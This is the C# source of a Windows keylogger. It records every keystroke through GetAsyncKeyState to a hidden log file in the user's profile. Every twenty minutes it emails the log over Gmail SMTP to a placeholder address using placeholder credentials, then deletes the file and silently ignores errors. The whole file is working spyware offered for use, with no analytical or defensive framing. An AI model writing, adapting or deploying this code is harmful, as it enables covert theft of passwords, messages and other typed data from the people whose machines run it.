using System;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Timers;

namespace KeyLogger
{
    class Program
    {
        private String path = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\Log.txt"; //Create new file with log info.

        [DllImport("user32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);
        static void Main(string[] args)
        {
            new Program().start();
        }

        private void start()
        {
            if (File.Exists(path)) File.SetAttributes(path, FileAttributes.Hidden);
            Timer t = new Timer();
            t.Interval = 60000 * 20; //Replace the 20 for the time in minutes before the Log is sent.
            t.Elapsed += sendEmail; //Send mail when the timer finishes.
            t.AutoReset = true; //Auto restart the timer.
            t.Enabled = true; //Is the timer enabled.

            while (true)
            {
                for (int i = 0; i < 255; i++)
                {
                    int key = GetAsyncKeyState(i);
                    if (key == 1 || key == -32767)
                    {
                        StreamWriter file = new StreamWriter(path, true); //Open the .txt file.
                        File.SetAttributes(path, FileAttributes.Hidden); //Set .txt file path and visibility.
                        file.Write(verifyKey(i)); //Write the key in the .txt file.
                        file.Close(); //Close the write session.
                        break; //Exit the loop once the key has been written.
                    }
                }
            }
        }

        private String verifyKey(int code) //Check the pressed key.
        {
            String key = "";

            //Key codes in ASCII format.
            if (code == 8) key = "[BACK]";
            else if (code == 9) key = "[TAB]";
            else if (code == 13) key = "[ENTER]";
            else if (code == 16) key = "[SHIFT]";
            else if (code == 17) key = "[CTRL]";
            else if (code == 18) key = "[ALT]";
            else if (code == 19) key = "[PAUSE/BREAK]";
            else if (code == 20) key = "[CAPS LOCK]";
            else if (code == 27) key = "[ESCAPE]";
            else if (code == 32) key = "[SPACE]";
            else if (code == 33) key = "[PAGE UP]";
            else if (code == 34) key = "[PAGE DOWN]";
            else if (code == 35) key = "[END]";
            else if (code == 36) key = "[HOME]";
            else if (code == 37) key = "[LEFT ARROW]";
            else if (code == 38) key = "[UP ARROW]";
            else if (code == 39) key = "[RIGHT ARROW]";
            else if (code == 40) key = "[DOWN ARROW]";
            else if (code == 44) key = "[PRINT SCREEN]";
            else if (code == 45) key = "[INSERT]";
            else if (code == 46) key = "[DELETE]";
            else if (code == 48) key = "0";
            else if (code == 49) key = "1";
            else if (code == 50) key = "2";
            else if (code == 51) key = "3";
            else if (code == 52) key = "4";
            else if (code == 53) key = "5";
            else if (code == 54) key = "6";
            else if (code == 55) key = "7";
            else if (code == 56) key = "8";
            else if (code == 57) key = "9";
            else if (code == 65) key = "a";
            else if (code == 66) key = "b";
            else if (code == 67) key = "c";
            else if (code == 68) key = "d";
            else if (code == 69) key = "e";
            else if (code == 70) key = "f";
            else if (code == 71) key = "g";
            else if (code == 72) key = "h";
            else if (code == 73) key = "i";
            else if (code == 74) key = "j";
            else if (code == 75) key = "k";
            else if (code == 76) key = "l";
            else if (code == 77) key = "m";
            else if (code == 78) key = "n";
            else if (code == 79) key = "o";
            else if (code == 80) key = "p";
            else if (code == 81) key = "q";
            else if (code == 82) key = "r";
            else if (code == 83) key = "s";
            else if (code == 84) key = "t";
            else if (code == 85) key = "u";
            else if (code == 86) key = "v";
            else if (code == 87) key = "w";
            else if (code == 88) key = "x";
            else if (code == 89) key = "y";
            else if (code == 90) key = "z";
            else if (code == 91) key = "[LEFT WINDOWS]";
            else if (code == 92) key = "[RIGHT WINDOWS]";
            else if (code == 93) key = "[LIST]";
            else if (code == 96) key = "NumPad 0";
            else if (code == 97) key = "NumPad 1";
            else if (code == 98) key = "NumPad 2";
            else if (code == 99) key = "NumPad 3";
            else if (code == 100) key = "NumPad 4";
            else if (code == 101) key = "NumPad 5";
            else if (code == 102) key = "NumPad 6";
            else if (code == 103) key = "NumPad 7";
            else if (code == 104) key = "NumPad 8";
            else if (code == 105) key = "NumPad 9";
            else if (code == 106) key = "*";
            else if (code == 107) key = "+";
            else if (code == 109) key = "-";
            else if (code == 110) key = ",";
            else if (code == 111) key = "/";
            else if (code == 112) key = "[F1]";
            else if (code == 113) key = "[F2]";
            else if (code == 114) key = "[F3]";
            else if (code == 115) key = "[F4]";
            else if (code == 116) key = "[F5]";
            else if (code == 117) key = "[F6]";
            else if (code == 118) key = "[F7]";
            else if (code == 119) key = "[F8]";
            else if (code == 120) key = "[F9]";
            else if (code == 121) key = "[F10]";
            else if (code == 122) key = "[F11]";
            else if (code == 123) key = "[F12]";
            else if (code == 144) key = "[NUM LOCK]";
            else if (code == 145) key = "[SCROLL LOCK]";
            else if (code == 160) key = "[SHIFT]";
            else if (code == 161) key = "[SHIFT]";
            else if (code == 162) key = "[CTRL]";
            else if (code == 163) key = "[CTRL]";
            else if (code == 164) key = "[ALT]";
            else if (code == 165) key = "[ALT]";
            else if (code == 187) key = "=";
            else if (code == 186) key = "ç";
            else if (code == 188) key = ",";
            else if (code == 189) key = "-";
            else if (code == 190) key = ".";
            else if (code == 192) key = "'";
            else if (code == 191) key = ";";
            else if (code == 193) key = "/";
            else if (code == 194) key = ".";
            else if (code == 219) key = "´";
            else if (code == 220) key = "]";
            else if (code == 221) key = "[";
            else if (code == 222) key = "~";
            else if (code == 226) key = "\\";
            else key = "[" + code + "]";

            return key; //Return the pressed key.
        }

        private void sendEmail(Object source, ElapsedEventArgs e)
        {
            try
            {
                MailMessage mail = new MailMessage(); //Start a new instance of Mail.
                SmtpClient server = new SmtpClient("smtp.gmail.com"); //Define the mail server.

                mail.From = new MailAddress("EMAILSENDER"); //Who send the mail?
                mail.To.Add("EMAILRECEIVER"); //Who receives the mail?
                mail.Subject = "[Log: " + Environment.UserName + "]";

                if (!File.Exists(path)) return;
                StreamReader r = new StreamReader(path); //Start a new StreamReader with the .txt path.
                String content = r.ReadLine(); //Read the file.
                r.Close(); //Close the reader.
                File.Delete(path); //Delete the file once it has been read.
                mail.Body = content; //Set the mail body (the data from the .txt file).

                server.Port = 587;
                server.Credentials = new NetworkCredential("EMAILSENDER", "EMAILPASSWORD"); //Mail credentials for sending the Log.
                server.EnableSsl = true; //Use SSL?
                server.Send(mail); //Send the Log via mail.
            }
            catch
            {
            }
        }
    }
}